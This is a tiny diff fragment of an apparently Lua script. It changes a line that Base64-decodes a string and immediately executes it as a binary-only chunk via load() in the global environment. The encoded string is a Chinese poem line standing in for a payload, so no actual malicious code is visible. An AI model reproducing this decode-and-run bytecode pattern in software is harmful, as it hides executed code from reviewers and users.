@@ -6,4 +6,6 @@
 
 --]]
 
-assert(load(Base64Decode("夜来风雨声 花落知多少"), nil, "bt", _ENV))()
+load(Base64Decode("夜来风雨声 花落知多少"),nil,"b",_ENV)()
+
+
